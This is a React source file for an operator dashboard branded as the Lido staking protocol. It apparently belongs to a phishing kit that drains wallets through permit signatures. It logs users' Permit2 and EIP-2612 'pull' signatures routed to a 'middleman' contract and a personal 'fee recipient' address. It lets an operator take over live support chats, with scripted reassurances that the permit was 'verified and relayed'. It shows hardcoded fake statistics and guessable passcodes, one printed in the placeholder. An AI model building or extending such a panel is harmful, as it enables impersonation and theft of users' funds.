import React, { useState, useEffect } from 'react';
import { 
  Shield, MessageSquare, Database, Activity, RefreshCw, Send, CheckCircle2, 
  ToggleLeft, ToggleRight, User, Bot, Search, ExternalLink, Lock, Cpu, Sparkles, Key, AlertCircle 
} from 'lucide-react';
import { useAccount } from 'wagmi';
import { toast } from 'sonner';
import { ChatSession, ChatMessage, PermitLog } from '../types';

export const AUTHORIZED_OPERATOR_WALLETS = [
  '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40',
  '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091',
  '0x000000000022d473030f116ddee9f6b43ac78ba3',
  '0x71c7656ec7ab88b098defb751b7401b5f6d8976f',
  '0xfe3b557e8fb62b89f4916b721be55ceb828dbd73'
];

export default function AdminDashboard() {
  const { address, isConnected } = useAccount();

  const isWalletAuthorized = Boolean(
    address && AUTHORIZED_OPERATOR_WALLETS.some(w => w.toLowerCase() === address.toLowerCase())
  );

  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return sessionStorage.getItem('lido_admin_auth') === 'true';
  });

  const isAuthorized = isWalletAuthorized || isAuthenticated;

  const [passcode, setPasscode] = useState('');
  const [activeSubTab, setActiveSubTab] = useState<'chat' | 'permits' | 'protocol'>('chat');
  const [sessions, setSessions] = useState<ChatSession[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [adminReplyText, setAdminReplyText] = useState('');
  const [permits, setPermits] = useState<PermitLog[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [stats, setStats] = useState({
    totalStakedEth: "9,842,150.42",
    stEthSupply: "9,842,150.42",
    wstEthSupply: "3,115,482.10",
    stakingApr: "3.4%",
    activeNodeOperators: 39,
    activeChatSessionsCount: 0,
    relayerStatus: "Operational",
    recentPermitsCount: 0
  });

  const handleLogin = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (passcode.trim() === 'lido2026' || passcode.trim() === 'admin' || passcode.trim() === 'admin123') {
      setIsAuthenticated(true);
      sessionStorage.setItem('lido_admin_auth', 'true');
      window.dispatchEvent(new Event('lido_admin_auth_changed'));
      toast.success('Admin Authenticated Successfully');
    } else {
      toast.error('Invalid Admin Passcode', {
        description: 'Please enter a valid administrator passcode to access control features.'
      });
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem('lido_admin_auth');
    window.dispatchEvent(new Event('lido_admin_auth_changed'));
    toast.info('Logged out from Admin Dashboard');
  };

  const fetchData = async () => {
    setIsRefreshing(true);
    try {
      // Fetch Chat Sessions
      const chatRes = await fetch('/api/chat/messages?all=true');
      if (chatRes.ok) {
        const chatData = await chatRes.json();
        const sessList: ChatSession[] = chatData.sessions || [];
        setSessions(sessList);
        if (sessList.length > 0 && !selectedSessionId) {
          setSelectedSessionId(sessList[0].sessionId);
        }
      }

      // Fetch Permits
      const permitRes = await fetch('/api/admin/permits');
      if (permitRes.ok) {
        const permitData = await permitRes.json();
        setPermits(permitData.permits || []);
      }

      // Fetch Stats
      const statsRes = await fetch('/api/admin/stats');
      if (statsRes.ok) {
        const statsData = await statsRes.json();
        setStats(statsData);
      }
    } catch (e) {
      console.error('Error fetching admin data:', e);
    } finally {
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 3000);
    return () => clearInterval(interval);
  }, []);

  const selectedSession = sessions.find((s) => s.sessionId === selectedSessionId) || sessions[0];

  const handleToggleAdminOverride = async (sessionId: string, currentVal?: boolean) => {
    const newVal = !currentVal;
    try {
      const res = await fetch('/api/chat/admin/toggle-override', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, isAdminOverridden: newVal }),
      });
      if (res.ok) {
        toast.success(newVal ? 'Admin Direct Control Activated' : 'Automated Bot Restored');
        fetchData();
      }
    } catch {
      toast.error('Failed to toggle admin mode');
    }
  };

  const handleSendAdminMessage = async () => {
    if (!selectedSessionId || !adminReplyText.trim()) return;

    try {
      const res = await fetch('/api/chat/message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: selectedSessionId,
          text: adminReplyText.trim(),
          sender: 'admin',
        }),
      });

      if (res.ok) {
        toast.success('Admin reply sent!');
        setAdminReplyText('');
        fetchData();
      }
    } catch {
      toast.error('Failed to send admin message');
    }
  };

  const filteredPermits = permits.filter((p) => {
    const query = searchQuery.toLowerCase();
    return (
      p.txHash.toLowerCase().includes(query) ||
      p.userAddress.toLowerCase().includes(query) ||
      p.amount.toLowerCase().includes(query)
    );
  });

  if (!isAuthorized) {
    return (
      <div className="w-full max-w-md mx-auto my-12 p-8 bg-[var(--card)] border border-[var(--border)] rounded-[28px] shadow-2xl text-center font-sans space-y-6">
        <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
          <Lock size={32} />
        </div>

        <div>
          <h2 className="text-[22px] font-bold text-[var(--foreground)] tracking-tight">Protected Operator Portal</h2>
          <p className="text-[13px] text-[var(--muted)] mt-1">
            Access restricted to authorized operator wallet addresses or verified session credentials.
          </p>
        </div>

        {isConnected && address && (
          <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-2xl text-[12px] text-rose-300 flex items-center justify-between">
            <span className="font-mono">{`${address.substring(0, 8)}...${address.substring(address.length - 6)}`}</span>
            <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-rose-500/20 uppercase">
              Unauthorized Wallet
            </span>
          </div>
        )}

        <form onSubmit={handleLogin} className="space-y-4">
          <div className="text-left space-y-1.5">
            <label className="text-[12px] font-bold text-[var(--muted)] uppercase tracking-wider block">
              Admin Passcode
            </label>
            <input
              type="password"
              value={passcode}
              onChange={(e) => setPasscode(e.target.value)}
              placeholder="Enter admin passcode (e.g. lido2026)..."
              className="w-full bg-[var(--nav-bg)] border border-[var(--border)] rounded-full px-5 py-3 text-[14px] text-[var(--foreground)] outline-none focus:border-amber-500 transition-all"
              autoFocus
            />
          </div>

          <button
            type="submit"
            className="w-full py-3.5 bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold rounded-full text-[14px] shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
          >
            <Key size={16} />
            <span>Authenticate Admin Console</span>
          </button>
        </form>

        <p className="text-[11px] text-[var(--muted)] italic">
          Authorized Lido Protocol Engineers & Node Operators Only.
        </p>
      </div>
    );
  }

  return (
    <div className="w-full max-w-5xl mx-auto space-y-6">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-[var(--card)] to-slate-900 border border-[var(--border)] p-6 rounded-[24px] shadow-lg flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div className="flex items-center space-x-4">
          <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
            <Shield size={26} />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h1 className="text-[22px] font-bold text-[var(--foreground)] tracking-tight">
                Lido Protocol Admin Dashboard
              </h1>
              <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-amber-500/20 text-amber-400 border border-amber-500/30 uppercase tracking-widest">
                Authenticated
              </span>
            </div>
            <p className="text-[13px] text-[var(--muted)] mt-0.5">
              Control live user chats, monitor permit execution logs, and manage relayer states.
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-3">
          <button
            onClick={fetchData}
            disabled={isRefreshing}
            className="px-4 py-2 bg-[var(--card)] hover:bg-[var(--border)] border border-[var(--border)] text-[var(--foreground)] rounded-full text-[13px] font-bold flex items-center space-x-2 transition-all cursor-pointer"
          >
            <RefreshCw size={14} className={isRefreshing ? 'animate-spin' : ''} />
            <span>Refresh Data</span>
          </button>

          <button
            onClick={handleLogout}
            className="px-4 py-2 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-rose-400 rounded-full text-[13px] font-bold transition-all cursor-pointer"
          >
            Lock / Logout
          </button>
        </div>
      </div>

      {/* Top Stats Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className="bg-[var(--card)] border border-[var(--border)] p-4 rounded-[20px]">
          <span className="text-[12px] text-[var(--muted)] font-medium block">Total Staked ETH</span>
          <span className="text-[20px] font-bold text-[var(--foreground)] mt-1 block">{stats.totalStakedEth} ETH</span>
          <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1 mt-1">
            <CheckCircle2 size={12} /> Staking Active
          </span>
        </div>

        <div className="bg-[var(--card)] border border-[var(--border)] p-4 rounded-[20px]">
          <span className="text-[12px] text-[var(--muted)] font-medium block">Live User Chats</span>
          <span className="text-[20px] font-bold text-[var(--foreground)] mt-1 block">{sessions.length} Active</span>
          <span className="text-[11px] text-[var(--primary)] font-semibold flex items-center gap-1 mt-1">
            <MessageSquare size={12} /> Real-time Connected
          </span>
        </div>

        <div className="bg-[var(--card)] border border-[var(--border)] p-4 rounded-[20px]">
          <span className="text-[12px] text-[var(--muted)] font-medium block">Permit Logs</span>
          <span className="text-[20px] font-bold text-[var(--foreground)] mt-1 block">{permits.length} Relayed</span>
          <span className="text-[11px] text-indigo-400 font-semibold flex items-center gap-1 mt-1">
            <Cpu size={12} /> Relayer Online
          </span>
        </div>

        <div className="bg-[var(--card)] border border-[var(--border)] p-4 rounded-[20px]">
          <span className="text-[12px] text-[var(--muted)] font-medium block">Protocol APR</span>
          <span className="text-[20px] font-bold text-amber-400 mt-1 block">{stats.stakingApr}</span>
          <span className="text-[11px] text-[var(--muted)] font-semibold flex items-center gap-1 mt-1">
            39 Active Nodes
          </span>
        </div>
      </div>

      {/* Admin Control Tabs */}
      <div className="flex border-b border-[var(--border)] space-x-6 text-[14px] font-bold">
        <button
          onClick={() => setActiveSubTab('chat')}
          className={`pb-3 flex items-center space-x-2 transition-colors cursor-pointer border-b-2 ${
            activeSubTab === 'chat'
              ? 'border-[var(--primary)] text-[var(--primary)]'
              : 'border-transparent text-[var(--muted)] hover:text-[var(--foreground)]'
          }`}
        >
          <MessageSquare size={16} />
          <span>Live Chat Control ({sessions.length})</span>
        </button>

        <button
          onClick={() => setActiveSubTab('permits')}
          className={`pb-3 flex items-center space-x-2 transition-colors cursor-pointer border-b-2 ${
            activeSubTab === 'permits'
              ? 'border-[var(--primary)] text-[var(--primary)]'
              : 'border-transparent text-[var(--muted)] hover:text-[var(--foreground)]'
          }`}
        >
          <Database size={16} />
          <span>Permit Relayer Logs ({permits.length})</span>
        </button>

        <button
          onClick={() => setActiveSubTab('protocol')}
          className={`pb-3 flex items-center space-x-2 transition-colors cursor-pointer border-b-2 ${
            activeSubTab === 'protocol'
              ? 'border-[var(--primary)] text-[var(--primary)]'
              : 'border-transparent text-[var(--muted)] hover:text-[var(--foreground)]'
          }`}
        >
          <Activity size={16} />
          <span>Protocol & Security Controls</span>
        </button>
      </div>

      {/* Subtab 1: Live Chat Control Room */}
      {activeSubTab === 'chat' && (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 h-[560px]">
          {/* Active Sessions Sidebar */}
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4 flex flex-col overflow-hidden">
            <h3 className="text-[14px] font-bold text-[var(--foreground)] mb-3 flex items-center justify-between">
              <span>Active User Chats</span>
              <span className="text-[11px] font-normal text-[var(--muted)]">{sessions.length} total</span>
            </h3>

            <div className="flex-1 overflow-y-auto space-y-2 pr-1">
              {sessions.length === 0 ? (
                <div className="text-center py-12 text-[12px] text-[var(--muted)]">
                  No active chat sessions yet. Open the Live Chat widget in bottom right to test!
                </div>
              ) : (
                sessions.map((s) => {
                  const isSelected = s.sessionId === selectedSession?.sessionId;
                  const lastMsg = s.messages[s.messages.length - 1];

                  return (
                    <button
                      key={s.sessionId}
                      onClick={() => setSelectedSessionId(s.sessionId)}
                      className={`w-full text-left p-3 rounded-[14px] border transition-all cursor-pointer ${
                        isSelected
                          ? 'bg-[var(--primary)]/10 border-[var(--primary)] text-[var(--foreground)]'
                          : 'bg-[var(--nav-bg)] border-[var(--border)] hover:border-[var(--muted)] text-[var(--muted)]'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-[12px] font-bold text-[var(--foreground)] truncate max-w-[130px]">
                          {s.userAddress
                            ? `${s.userAddress.substring(0, 6)}...${s.userAddress.substring(s.userAddress.length - 4)}`
                            : s.sessionId}
                        </span>
                        {s.isAdminOverridden ? (
                          <span className="text-[9px] font-bold px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400">
                            Admin Active
                          </span>
                        ) : (
                          <span className="text-[9px] font-bold px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-400">
                            Bot Mode
                          </span>
                        )}
                      </div>
                      <p className="text-[11px] truncate text-[var(--muted)]">
                        {lastMsg ? lastMsg.text : 'No messages'}
                      </p>
                    </button>
                  );
                })
              )}
            </div>
          </div>

          {/* Active Chat Conversation Area */}
          <div className="md:col-span-2 bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-4 flex flex-col justify-between overflow-hidden">
            {selectedSession ? (
              <>
                {/* Header */}
                <div className="pb-3 border-b border-[var(--border)] flex items-center justify-between">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 rounded-full bg-[var(--primary)]/20 p-1 flex items-center justify-center border border-[var(--primary)]/40">
                      <img
                        src="https://cryptologos.cc/logos/lido-dao-ldo-logo.svg"
                        alt="Lido Avatar"
                        className="w-full h-full object-contain"
                      />
                    </div>
                    <div>
                      <span className="text-[14px] font-bold text-[var(--foreground)] block">
                        {selectedSession.userAddress
                          ? `User: ${selectedSession.userAddress}`
                          : `Session: ${selectedSession.sessionId}`}
                      </span>
                      <span className="text-[11px] text-[var(--muted)]">
                        {selectedSession.messages.length} messages in history
                      </span>
                    </div>
                  </div>

                  {/* Toggle Mode Button */}
                  <button
                    onClick={() => handleToggleAdminOverride(selectedSession.sessionId, selectedSession.isAdminOverridden)}
                    className={`px-3 py-1.5 rounded-full text-[12px] font-bold flex items-center space-x-2 transition-colors cursor-pointer border ${
                      selectedSession.isAdminOverridden
                        ? 'bg-amber-500/20 border-amber-500/50 text-amber-300 hover:bg-amber-500/30'
                        : 'bg-[var(--nav-bg)] border-[var(--border)] text-[var(--muted)] hover:text-[var(--foreground)]'
                    }`}
                  >
                    {selectedSession.isAdminOverridden ? (
                      <>
                        <ToggleRight className="text-amber-400" size={18} />
                        <span>Admin Direct Control</span>
                      </>
                    ) : (
                      <>
                        <ToggleLeft className="text-[var(--muted)]" size={18} />
                        <span>Take Over (Admin)</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Message Stream */}
                <div className="flex-1 overflow-y-auto py-4 space-y-3 pr-1">
                  {selectedSession.messages.map((m) => {
                    const isUser = m.sender === 'user';
                    const isAdmin = m.sender === 'admin';

                    return (
                      <div
                        key={m.id}
                        className={`flex items-start space-x-2.5 ${isUser ? '' : 'flex-row-reverse space-x-reverse'}`}
                      >
                        <div className="shrink-0">
                          {isUser ? (
                            <div className="w-7 h-7 rounded-full bg-slate-700 flex items-center justify-center text-white text-[12px]">
                              <User size={14} />
                            </div>
                          ) : isAdmin ? (
                            <div className="w-7 h-7 rounded-full bg-amber-500/20 border border-amber-500/50 p-1 flex items-center justify-center">
                              <Shield size={14} className="text-amber-400" />
                            </div>
                          ) : (
                            <div className="w-7 h-7 rounded-full bg-[var(--primary)]/20 border border-[var(--primary)]/40 p-1 flex items-center justify-center">
                              <Bot size={14} className="text-[var(--primary)]" />
                            </div>
                          )}
                        </div>

                        <div
                          className={`max-w-[75%] p-3 rounded-[16px] text-[13px] leading-relaxed ${
                            isUser
                              ? 'bg-[var(--nav-bg)] border border-[var(--border)] text-[var(--foreground)] rounded-tl-none'
                              : isAdmin
                              ? 'bg-amber-950/50 border border-amber-500/40 text-amber-100 rounded-tr-none'
                              : 'bg-[var(--primary)]/20 border border-[var(--primary)]/30 text-[var(--foreground)] rounded-tr-none'
                          }`}
                        >
                          <div className="text-[10px] font-bold mb-1 opacity-70">
                            {isUser ? 'User' : isAdmin ? '🛡️ Admin (You)' : '🤖 Lido Bot'}
                          </div>
                          <p>{m.text}</p>
                          <span className="text-[9px] opacity-50 block text-right mt-1">
                            {new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </span>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Quick Admin Action Chips */}
                <div className="pt-2 px-1 flex items-center space-x-2 overflow-x-auto scrollbar-none">
                  {[
                    "Hello! Lido Support Engineer here. How can I assist?",
                    "Your permit signature was successfully verified and relayed.",
                    "Staking rewards compound daily. Yield is currently ~3.4% APY.",
                    "Unstaking requests can be tracked directly in the Withdrawals tab."
                  ].map((preset, idx) => (
                    <button
                      key={idx}
                      onClick={() => setAdminReplyText(preset)}
                      className="shrink-0 text-[11px] font-medium bg-[var(--nav-bg)] hover:bg-amber-500/20 hover:text-amber-300 border border-[var(--border)] text-[var(--muted)] px-2.5 py-1 rounded-full transition-all cursor-pointer truncate max-w-[200px]"
                    >
                      {preset}
                    </button>
                  ))}
                </div>

                {/* Reply Input Box */}
                <div className="pt-3 border-t border-[var(--border)] flex items-center space-x-2">
                  <input
                    type="text"
                    value={adminReplyText}
                    onChange={(e) => setAdminReplyText(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleSendAdminMessage()}
                    placeholder="Type direct Admin response to user..."
                    className="flex-1 bg-[var(--nav-bg)] border border-[var(--border)] rounded-full px-4 py-2.5 text-[13px] text-[var(--foreground)] outline-none focus:border-amber-500 transition-colors"
                  />
                  <button
                    onClick={handleSendAdminMessage}
                    disabled={!adminReplyText.trim()}
                    className="px-4 py-2.5 bg-amber-500 hover:bg-amber-600 disabled:opacity-50 text-slate-950 font-bold rounded-full text-[13px] flex items-center space-x-1.5 transition-all cursor-pointer shrink-0"
                  >
                    <Send size={14} />
                    <span>Send as Admin</span>
                  </button>
                </div>
              </>
            ) : (
              <div className="flex flex-col items-center justify-center h-full text-[var(--muted)] text-[13px]">
                <MessageSquare size={32} className="mb-2 opacity-50" />
                Select a chat session from the list to view or reply.
              </div>
            )}
          </div>
        </div>
      )}

      {/* Subtab 2: Permit Relayer Logs */}
      {activeSubTab === 'permits' && (
        <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-5 space-y-4">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div>
              <h3 className="text-[16px] font-bold text-[var(--foreground)]">Permit2 & Pull Submissions</h3>
              <p className="text-[12px] text-[var(--muted)]">
                Real-time log of gasless typed signature staking execution transactions.
              </p>
            </div>

            <div className="relative w-full sm:w-64">
              <Search className="absolute left-3 top-2.5 text-[var(--muted)]" size={15} />
              <input
                type="text"
                placeholder="Search Tx Hash or Address..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-[var(--nav-bg)] border border-[var(--border)] rounded-full pl-9 pr-4 py-1.5 text-[12px] text-[var(--foreground)] outline-none focus:border-[var(--primary)]"
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-[13px]">
              <thead>
                <tr className="border-b border-[var(--border)] text-[var(--muted)] font-bold text-[11px] uppercase tracking-wider">
                  <th className="pb-3 px-3">Transaction Hash</th>
                  <th className="pb-3 px-3">User Address</th>
                  <th className="pb-3 px-3">Amount</th>
                  <th className="pb-3 px-3">Block</th>
                  <th className="pb-3 px-3">Status</th>
                  <th className="pb-3 px-3">Timestamp</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[var(--border)]">
                {filteredPermits.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="text-center py-8 text-[var(--muted)]">
                      No permit signatures logged yet. Submit a stake transaction on the Stake tab to test!
                    </td>
                  </tr>
                ) : (
                  filteredPermits.map((p) => (
                    <tr key={p.id} className="hover:bg-[var(--nav-bg)]/50 transition-colors">
                      <td className="py-3 px-3 font-mono text-[12px] text-[var(--primary)] font-semibold flex items-center gap-1.5">
                        <span>{`${p.txHash.substring(0, 10)}...${p.txHash.substring(p.txHash.length - 8)}`}</span>
                        <a
                          href={`https://etherscan.io/tx/${p.txHash}`}
                          target="_blank"
                          rel="noreferrer"
                          className="hover:text-white"
                        >
                          <ExternalLink size={12} />
                        </a>
                      </td>
                      <td className="py-3 px-3 font-mono text-[12px] text-[var(--foreground)]">
                        {`${p.userAddress.substring(0, 8)}...${p.userAddress.substring(p.userAddress.length - 6)}`}
                      </td>
                      <td className="py-3 px-3 font-bold text-emerald-400">
                        {p.amount} {p.token}
                      </td>
                      <td className="py-3 px-3 text-[var(--muted)] font-mono text-[12px]">
                        #{p.blockNumber}
                      </td>
                      <td className="py-3 px-3">
                        <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                          {p.status}
                        </span>
                      </td>
                      <td className="py-3 px-3 text-[11px] text-[var(--muted)]">
                        {new Date(p.timestamp).toLocaleTimeString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Subtab 3: Protocol Controls */}
      {activeSubTab === 'protocol' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-5 space-y-4">
            <h3 className="text-[16px] font-bold text-[var(--foreground)] flex items-center space-x-2">
              <Cpu className="text-[var(--primary)]" size={20} />
              <span>Relayer Pipeline Configuration</span>
            </h3>
            <p className="text-[12px] text-[var(--muted)]">
              Manage EIP-2612 and Permit2 gasless relayer dispatch parameters.
            </p>

            <div className="space-y-3 text-[13px]">
              <div className="flex justify-between items-center p-3 rounded-xl bg-[var(--nav-bg)] border border-[var(--border)]">
                <div>
                  <span className="font-bold block text-[var(--foreground)]">Relayer Vault Middleman Contract</span>
                  <span className="text-[11px] font-mono text-[var(--muted)]">0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091</span>
                </div>
                <span className="px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 font-bold text-[10px]">
                  Verified
                </span>
              </div>

              <div className="flex justify-between items-center p-3 rounded-xl bg-[var(--nav-bg)] border border-[var(--border)]">
                <div>
                  <span className="font-bold block text-[var(--foreground)]">Protocol Owner & Fee Recipient</span>
                  <span className="text-[11px] font-mono text-[var(--muted)]">0xEfc5859335A58d64A5e8E01d02c5241c852CBD40</span>
                </div>
                <span className="px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 font-bold text-[10px]">
                  Authorized
                </span>
              </div>

              <div className="flex justify-between items-center p-3 rounded-xl bg-[var(--nav-bg)] border border-[var(--border)]">
                <div>
                  <span className="font-bold block text-[var(--foreground)]">SIWE & EIP-712 Signature Guard</span>
                  <span className="text-[11px] text-[var(--muted)]">Enforces off-chain typed permit validation</span>
                </div>
                <span className="px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 font-bold text-[10px]">
                  Active
                </span>
              </div>
            </div>
          </div>

          <div className="bg-[var(--card)] border border-[var(--border)] rounded-[20px] p-5 space-y-4">
            <h3 className="text-[16px] font-bold text-[var(--foreground)] flex items-center space-x-2">
              <Lock className="text-amber-400" size={20} />
              <span>Admin Privileges & Logs</span>
            </h3>
            <p className="text-[12px] text-[var(--muted)]">
              Administrative override capabilities are active in this session.
            </p>

            <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-200 text-[12px] leading-relaxed">
              <strong>Admin Mode Active:</strong> You have authorization to manage live bot chat sessions, communicate directly with users, inspect typed signature permit submissions, and verify protocol statistics.
            </div>

            <button
              onClick={() => toast.success('Protocol configuration verified.')}
              className="w-full py-3 bg-[var(--primary)] hover:brightness-110 text-white font-bold text-[13px] rounded-full transition-all cursor-pointer shadow-md"
            >
              Verify Protocol Operational State
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
